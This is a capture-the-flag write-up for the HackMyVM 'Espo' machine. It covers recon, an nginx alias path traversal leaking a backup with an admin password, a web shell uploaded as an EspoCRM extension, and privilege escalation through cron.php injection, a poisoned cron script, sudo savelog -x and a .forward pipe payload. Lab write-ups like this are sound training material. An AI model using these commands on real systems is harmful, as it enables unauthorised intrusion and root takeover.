# Espo

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.115:22
Open 10.0.2.115:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.115
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp open  http    syn-ack nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: EspoCRM
|_http-favicon: Unknown favicon MD5: C06258A1C837E5E204FF9FFB19262DB8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/espo/writeup.png)

```bash
‚îî‚îÄ$ feroxbuster -u http://10.0.2.115 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2 -n -r
...
403      GET        7l        9w      146c http://10.0.2.115/.gitreview~
403      GET        7l        9w      146c http://10.0.2.115/.gitreview.bak
403      GET        7l        9w      146c http://10.0.2.115/.gitreview.bak2
403      GET        7l        9w      146c http://10.0.2.115/.gitreview.old
403      GET        7l        9w      146c http://10.0.2.115/.gitreview.1
200      GET        3l       10w     1644c http://10.0.2.115/client/img/favicon.ico
200      GET      177l    28922w   899383c http://10.0.2.115/client/lib/espo.min.js
200      GET       47l      124w     2480c http://10.0.2.115/
200      GET       16l       38w      439c http://10.0.2.115/admin/
403      GET        7l        9w      146c http://10.0.2.115/api/
403      GET        7l        9w      146c http://10.0.2.115/client/
200      GET       47l      124w     2480c http://10.0.2.115/index.php
200      GET        2l        4w       26c http://10.0.2.115/robots.txt
403      GET        7l        9w      146c http://10.0.2.115/web.config
403      GET        7l        9w      146c http://10.0.2.115/web.config~
...
```

There's 403 and 404 errors, some path get denied and some are not found.
```bash
‚îî‚îÄ$ curl http://10.0.2.115/api/ -Is | head -1
HTTP/1.1 403 Forbidden

‚îî‚îÄ$ curl http://10.0.2.115/apis/ -Is | head -1
HTTP/1.1 404 Not Found
```

Nothing
```bash
‚îî‚îÄ$ nomore403 -u http://10.0.2.115/api/ -f /opt/nomore403/payloads --http | grep -v ^403
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ CUSTOM PATHS ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
200               2864 bytes http://10.0.2.115/api/;%2f..%2f..%2f #<-- Kinda interesting
200               2864 bytes http://10.0.2.115/#?api/
200               2864 bytes http://10.0.2.115/#api/
200               2864 bytes http://10.0.2.115///?anythingapi/
200               2864 bytes http://10.0.2.115/?api/
200               2864 bytes http://10.0.2.115/???api/
200               2864 bytes http://10.0.2.115/??api/
```

### Nginx Path Traversal

The webserver is Nginx and most common misconfiguration includes `alias`
- [Path traversal via misconfigured NGINX alias](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias)

```bash
‚îî‚îÄ$ ffuf -u 'http://10.0.2.115/admin../FUZZ' -w /usr/share/seclists/Discovery/Web-Content/big.txt -fs 146
_oldsite                [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 10ms]
admin                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 10ms]
```

### Backup

```bash
‚îî‚îÄ$ feroxbuster -u http://10.0.2.115/admin../_oldsite -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2 -n -r
200      GET       11l       79w      540c http://10.0.2.115/admin../_oldsite/info

‚îî‚îÄ$ curl http://10.0.2.115/admin../_oldsite/info
# Backup Configuration Settings
# This configuration file dictates the backup protocols for critical data storage.

# Directory for storing backup files
# All backup files are stored in compressed ZIP format for efficient space usage and security.
# Ensure that backups are regularly updated and verified for data integrity.

backup_directory: /admin/_oldsite
backup_format: zip
# Note: The backup directory is designated for ZIP file backups only.
# Regular maintenance and checks are required to ensure data consistency and reliability.

‚îî‚îÄ$ curl http://10.0.2.115/admin../_oldsite/backup.zip -O
‚îî‚îÄ$ unzip backup.zip -d backup
‚îî‚îÄ$ cd backup/data
‚îî‚îÄ$ grep pass config.php -i -A1 -B1
  'smtpUsername' => 'admin',
  'smtpPassword' => '39Ue4kcVJ#YpaAV24CNmbWU',
  'language' => 'en_US',
--
  'ldapPortalUserLdapAuth' => false,
  'passwordGenerateLength' => 10,
  'massActionIdleCountThreshold' => 100,
```

### EspoCRM

::: info Creds
`admin:39Ue4kcVJ#YpaAV24CNmbWU`
:::

![writeup-1.png](/assets/pentest/hackmyvm/espo/writeup-1.png)

Version is `7.2.4`

![writeup-2.png](/assets/pentest/hackmyvm/espo/writeup-2.png)

![writeup-3.png](/assets/pentest/hackmyvm/espo/writeup-3.png)

- [https://cvefeed.io/vuln/detail/CVE-2023-5966](https://cvefeed.io/vuln/detail/CVE-2023-5966)
- POC Not Found: [https://github.com/pedrojosenavasperez/cve-2023-5965](https://github.com/pedrojosenavasperez/cve-2023-5965)

No POC so we have to wing it.
- [Making extension package](https://docs.espocrm.com/development/extension-packages)
- [https://devcrm.it/product-category/free](https://devcrm.it/product-category/free)
	- [https://devcrm.it/product/uuid-field](https://devcrm.it/product/uuid-field)
		- [https://devcrm.it/download/?file=33a766ac-c5e0-4f77-91a3-9f1c5cb68983](https://devcrm.it/download/?file=33a766ac-c5e0-4f77-91a3-9f1c5cb68983)

```bash
‚îî‚îÄ$ curl 'https://devcrm.it/download/?file=33a766ac-c5e0-4f77-91a3-9f1c5cb68983' -Lo 'UUID field for EspoCRM.zip'
‚îî‚îÄ$ mkdir -p files/public
‚îî‚îÄ$ cp /opt/scripts/shells/p0wny-shell/shell.php files/public
‚îî‚îÄ$ zip 'UUID field for EspoCRM.zip' ./files/public/shell.php
  adding: files/public/shell.php (deflated 76%)
```

Upload

![writeup-4.png](/assets/pentest/hackmyvm/espo/writeup-4.png)

### Web Shell

![writeup-5.png](/assets/pentest/hackmyvm/espo/writeup-5.png)

We can read user files
```bash
www-data@espo:‚Ä¶/www/html# find /home -ls 2>/dev/null | grep -v oh-my
   261122      4 drwxr-xr-x   3 root     root         4096 Jan 24  2024 /home
   261131      4 drwxr-xr-x   6 mandie   mandie       4096 Nov 22 16:26 /home/mandie
   261640      0 lrwxrwxrwx   1 root     root            9 Jan 26  2024 /home/mandie/.bash_history -> /dev/null
   261133      4 -rw-r--r--   1 mandie   mandie        807 Dec  4  2023 /home/mandie/.profile
   264656      4 -rwxr-xr--   1 mandie   mandie        493 Dec  4  2023 /home/mandie/copyPics
   263083      4 drwxr-xr-x   2 mandie   mandie       4096 Nov 22 16:26 /home/mandie/pictures
   263056    264 -rw-r--r--   1 mandie   mandie     268188 Nov 22 16:26 /home/mandie/pictures/family.jpg
   263057    292 -rw-r--r--   1 mandie   mandie     298808 Nov 22 16:26 /home/mandie/pictures/burger.jpeg
   263061    232 -rw-r--r--   1 mandie   mandie     236712 Nov 22 16:26 /home/mandie/pictures/dad-baby.jpg
   263064     64 -rw-r--r--   1 mandie   mandie      61521 Nov 22 16:26 /home/mandie/pictures/bedroom.jpg
   263067    248 -rw-r--r--   1 mandie   mandie     251902 Nov 22 16:26 /home/mandie/pictures/maldives.jpg
   263068     60 -rw-r--r--   1 mandie   mandie      61324 Nov 22 16:26 /home/mandie/pictures/dorothy.jpeg
   261684      4 drwxr-xr-x   3 mandie   mandie       4096 Dec  4  2023 /home/mandie/.local
   264613      4 drwx------   3 mandie   mandie       4096 Dec  4  2023 /home/mandie/.local/share
   261643      4 -rwx------   1 mandie   mandie         33 Jan 24  2024 /home/mandie/user.txt
   261134      4 -rw-r--r--   1 mandie   mandie        220 Dec  4  2023 /home/mandie/.bash_logout
   261135      4 -rw-r--r--   1 mandie   mandie       3890 Dec  4  2023 /home/mandie/.zshrc
   264660      4 drwxr-xr-x   2 mandie   mandie       4096 Nov 22 16:26 /home/mandie/videos
   263065   6624 -rw-r--r--   1 mandie   mandie    6779935 Nov 22 16:26 /home/mandie/videos/sky.mp4
   263038      4 -rw-r--r--   1 mandie   mandie       3526 Dec  4  2023 /home/mandie/.bashr
```

If we had to guess `/home/mandie/copyPics` is most definitely a cronjob.
```bash
www-data@espo:/home/mandie# cat /home/mandie/copyPics
#!/bin/bash

SOURCE_MEDIAS="/var/shared_medias"
PICTURES_DIR="$HOME/pictures"
VIDEOS_DIR="$HOME/videos"

/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2>/dev/null \;
mkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"

declare -A directory_mappings
directory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )

for dir in "${!directory_mappings[@]}"; do
    for ext in ${directory_mappings[$dir]}; do
        mv "$HOME"/*.$ext "$dir/" 2>/dev/null
    done
done
```

Yeap
```bash
www-data@espo:/tmp# curl -LOs https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
www-data@espo:/tmp# chmod +x pspy64
www-data@espo:/tmp# timeout 120 ./pspy64
...
2025/11/22 16:43:01 [34;1mCMD: UID=0     PID=3896   | /usr/sbin/CRON -f
2025/11/22 16:43:01 [34;1mCMD: UID=0     PID=3898   | /bin/sh -c cd /var/www/html; /usr/bin/php -f cron.php > /dev/null 2>&1
2025/11/22 16:43:01 [35;1mCMD: UID=1000  PID=3899   | /bin/sh -c /home/mandie/copyPics
2025/11/22 16:43:01 [35;1mCMD: UID=1000  PID=3900   | /bin/bash /home/mandie/copyPics
2025/11/22 16:43:01 [35;1mCMD: UID=1000  PID=3901   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ;
2025/11/22 16:43:01 [35;1mCMD: UID=1000  PID=3902   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ;
2025/11/22 16:43:01 [35;1mCMD: UID=1000  PID=3903   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ;
2025/11/22 16:43:01 [35;1mCMD: UID=1000  PID=3904   | /usr/bin/cp /var/shared_medias/bedroom.jpg /home/mandie
2025/11/22 16:43:01 [35;1mCMD: UID=1000  PID=3905   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ;
2025/11/22 16:43:01 [35;1mCMD: UID=1000  PID=3906   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ;
2025/11/22 16:43:01 [35;1mCMD: UID=1000  PID=3907   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ;
2025/11/22 16:43:01 [35;1mCMD: UID=1000  PID=3908   | /bin/bash /home/mandie/copyPics
...
```

## Privilege Escalation (mandie)

### Unintended, direct toor toor

Root executed `cron.php` every 1-2 minutes, as `www-data` we can abuse this.
```bash
www-data@espo:‚Ä¶/www/html# echo 'system("install -m4777 /bin/bash /tmp/rootbash");' >> cron.php
www-data@espo:‚Ä¶/www/html# /tmp/rootbash -p -c id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

### Intended, copyPics

The following line copies any executable files to home directory, where the script is stored. We can create malicious `copyPics`, make it executable, cron will copy it and then we wait for it to get executed again.
```bash
/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2>/dev/null \;
```

```bash
www-data@espo:‚Ä¶/html/public# cp /home/mandie/copyPics /var/shared_medias
www-data@espo:‚Ä¶/html/public# echo 'install -m4777 /bin/bash /tmp/mandiebash' >> /var/shared_medias/copyPics
www-data@espo:‚Ä¶/html/public# /tmp/mandiebash -p -c id
uid=33(www-data) gid=33(www-data) euid=1000(mandie) groups=33(www-data)
```

Upgrade to SSH
```bash
‚îî‚îÄ$ ssh-keygen -f id_rsa -P x -q
‚îî‚îÄ$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' >> ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIoZ6TbWJ2v0X2ZO2L4x/sX/Y/k86CTkeNgkEPrzvrzk woyag@kraken' >> ~/.ssh/authorized_keys
---
# Change `~` to `/home/mandie`
www-data@espo:‚Ä¶/html/public# /tmp/mandiebash -p -c "mkdir /home/mandie/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIoZ6TbWJ2v0X2ZO2L4x/sX/Y/k86CTkeNgkEPrzvrzk woyag@kraken' >> /home/mandie/.ssh/authorized_keys"
---
‚îî‚îÄ$ ssssh-keygen -f id_rsa -P x -q
‚ï∞‚îÄ$ id
uid=1000(mandie) gid=1000(mandie) groups=1000(mandie),100(users)
```

### User.txt

```bash
‚ï∞‚îÄ$ cat user.txt
b462a4ac056477047a56ea23e6bbce19
```

## Privilege Escalation (root)

```bash
‚ï∞‚îÄ$ sudo -l
sudo: unable to resolve host espo: Name or service not known
Matching Defaults entries for mandie on espo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mandie may run the following commands on espo:
    (ALL : ALL) NOPASSWD: /usr/bin/savelog

‚ï∞‚îÄ$ cat /usr/bin/savelog
#! /bin/sh
# savelog - save a log file
#    Copyright (C) 1987, 1988 Ronald S. Karr and Landon Curt Noll
#    Copyright (C) 1992  Ronald S. Karr

‚ï∞‚îÄ$ savelog -h
Usage: savelog [-m mode] [-u user] [-g group] [-t] [-c cycle] [-p]
             [-j] [-C] [-d] [-l] [-r rolldir] [-n] [-q] file ...
        -m mode    - chmod log files to mode
        -u user    - chown log files to user
        -g group   - chgrp log files to group
        -c cycle   - save cycle versions of the logfile (default: 7)
        -r rolldir - use rolldir instead of . to roll files
        -C         - force cleanup of cycled logfiles
        -d         - use standard date for rolling
        -D         - override date format for -d
        -t         - touch file
        -l         - dont compress any log files (default: compress)
        -p         - preserve mode/user/group of original file
        -j         - use bzip2 instead of gzip
        -J         - use xz instead of gzip
        -1 .. -9   - compression strength or memory usage (default: 9, except for xz)
        -x script  - invoke script with rotated log file in $FILE
        -n         - do not rotate empty files
        -q         - suppress rotation message
        file       - log file names

‚ï∞‚îÄ$ sudo savelog -x /bin/zsh letmein
‚ï∞‚îÄ# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
‚ï∞‚îÄ# cat /root/root.txt
0f4580e1632070ea32ead6334c0527c4
```

## P.S.

Very interesting approach by [Om Chaudhari](https://medium.com/@mrwhitecap?source=post_page---byline--c2bb7f8af751---------------------------------------) in [HackMyVm : Espo](https://medium.com/@mrwhitecap/hackmyvm-espo-c2bb7f8af751)

`.forward` is a long-standing feature supported by MTAs such as Postfix, Exim, and Sendmail.  
When a local user has a `.forward` file, the MTA **does not deliver mail to the user‚Äôs mailbox**. Instead, it uses the content of `.forward` to decide how to handle incoming mail.

This file may contain:
- an email address (forwarding)
- a pipe (`| command`) to execute a program
- a path to an executable file

If the entry is an executable, the MTA **pipes the message content directly into it**.  
This effectively gives the attacker **arbitrary command execution as that user**, triggered automatically by incoming mail.

- [https://man7.org/linux/man-pages/man5/forward.5.html](https://man7.org/linux/man-pages/man5/forward.5.html)

```bash
### Create Payload
www-data@espo:/var/shared_medias# echo '#!/bin/bash\ninstall -m 4777 /bin/zsh /tmp/mandiezsh' | tee /tmp/t.sh
#!/bin/bash
install -m 4777 /bin/zsh /tmp/mandiezsh

### Set Payload
www-data@espo:/var/shared_medias# chmod +x /tmp/t.sh
www-data@espo:/var/shared_medias# echo '|/tmp/t.sh' > .forward

### Trigger
www-data@espo:/var/shared_medias# echo hello | mail -s letmein mandie

### Pwned
www-data@espo:/var/shared_medias# ls -alh /tmp/mandiezsh
-rwsrwxrwx 1 mandie mandie 846K Nov 22 17:30 /tmp/mandiezsh

www-data@espo:/var/shared_medias# /tmp/mandiezsh -p -c id
uid=33(www-data) gid=33(www-data) euid=1000(mandie) groups=33(www-data)
```

